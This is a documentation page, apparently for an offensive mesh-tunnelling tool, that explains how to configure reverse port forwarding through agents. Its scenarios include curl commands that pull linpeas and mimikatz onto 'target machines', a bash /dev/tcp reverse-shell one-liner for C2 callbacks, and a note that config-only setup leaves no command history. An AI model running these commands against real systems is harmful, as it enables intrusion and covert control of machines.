---
title: Port Forwarding
sidebar_position: 7
---

<div style={{textAlign: 'center', marginBottom: '2rem'}}>
  <img src="/img/mole-presenting.png" alt="Mole presenting port forwarding" style={{maxWidth: '180px'}} />
</div>

# Port Forwarding

Expose local services through your mesh network. Run a web server on your machine and make it accessible from any agent in the mesh - even when you're many network hops away.

```bash
# From a target machine deep in the network:
curl http://nearest-agent:8080/tools/linpeas.sh -o /tmp/lp.sh
```

This downloads from your local web server, tunneled through the mesh.

## How It Works

Port forwarding creates **reverse tunnels** - the opposite direction from SOCKS5 proxy:

```
SOCKS5 (Outbound - you reach remote destinations):
  Your App --> Ingress Agent --> Transit --> Exit Agent --> Remote Server

Port Forwarding (Inbound - remote machines reach you):
  Your Service <-- Endpoint Agent <-- Transit <-- Listener Agent <-- Remote Client
```

**Endpoints** run on the agent with access to your service. **Listeners** run on agents where remote clients will connect.

## Port Forwarding vs SOCKS5

| Aspect | SOCKS5 Proxy | Port Forwarding |
|--------|--------------|-----------------|
| **Direction** | Outbound (you reach remote) | Inbound (remote reaches you) |
| **Use case** | Access remote resources | Expose local services |
| **Who initiates** | Your local application | Remote application |
| **Configuration** | `socks5` + `exit` sections | `forward` section |
| **Example** | Browse internal network via proxy | Serve tools to field agents |

## Configuration

Port forwarding uses **routing keys** to match listeners with endpoints:

```yaml
# On YOUR machine (where the service runs) - the "endpoint"
forward:
  endpoints:
    - key: "my-tools"           # Routing key (advertised to mesh)
      target: "localhost:80"     # Your local service

# On REMOTE agents (where clients connect) - the "listeners"
forward:
  listeners:
    - key: "my-tools"           # Must match endpoint key
      address: ":8080"          # Port remote clients use
      max_connections: 100      # Optional limit
```

See [Configuration - Forward](/configuration/forward) for full reference.

## Common Scenarios

### Tool Distribution

Serve payloads, scripts, and executables to target machines throughout the network:

```yaml
# Operator machine
forward:
  endpoints:
    - key: "op-tools"
      target: "localhost:8000"
```

```bash
# Start a simple HTTP server
python3 -m http.server 8000 --directory ./tools
```

```yaml
# All field agents
forward:
  listeners:
    - key: "op-tools"
      address: "127.0.0.1:8080"
```

From any target machine: `curl http://field-agent:8080/mimikatz.exe -o mimi.exe`

### C2 Callback Reception

Receive reverse shells or C2 callbacks through the mesh:

```yaml
# Operator machine
forward:
  endpoints:
    - key: "callback-443"
      target: "localhost:4444"
```

```yaml
# Perimeter agent (exposed to target network)
forward:
  listeners:
    - key: "callback-443"
      address: "0.0.0.0:443"
```

From target: `bash -i >& /dev/tcp/perimeter-agent/443 0>&1`

The callback traverses the mesh to your local netcat listener.

### Multiple Services

Expose several services through different routing keys:

```yaml
forward:
  endpoints:
    - key: "http-tools"
      target: "localhost:80"
    - key: "smb-share"
      target: "localhost:445"
    - key: "ssh-jump"
      target: "localhost:22"
```

## Security Features

- **E2E Encryption**: Each connection gets its own encrypted session (X25519 + ChaCha20-Poly1305). Transit agents cannot decrypt traffic.

- **Routing Key Matching**: Only pre-configured keys work. Unknown keys are rejected.

- **Connection Limits**: Set `max_connections` on listeners to prevent resource exhaustion.

- **Configuration Only**: No CLI commands exist for port forwarding - all setup is via config files, leaving no command history.

## Monitoring

View all active port forward routes in the [Web Dashboard](/features/web-dashboard):

| Column | Description |
|--------|-------------|
| **Key** | Routing key linking listeners to endpoints |
| **Ingress** | Agent running the listener |
| **Listener** | Listen address on ingress |
| **Exit** | Agent running the endpoint |
| **Target** | Service address on exit |
| **Hops** | Number of mesh hops |

The table shows all ingress-exit combinations. If multiple agents have listeners or endpoints for the same key, all pairings are displayed.

You can also query the data programmatically:

```bash
curl http://localhost:8080/api/dashboard | jq '.forward_routes'
```

## Limitations

- **TCP only**: UDP is not supported for port forwarding
- **Fixed keys**: Routing keys must be pre-configured on both endpoints and listeners
- **No dynamic ports**: Unlike ngrok, ports are not dynamically assigned

## Related

- [Configuration - Forward](/configuration/forward) - Full configuration reference
- [Concepts - Routing](/concepts/routing) - How routes propagate through the mesh
- [Security - E2E Encryption](/security/e2e-encryption) - Encryption details
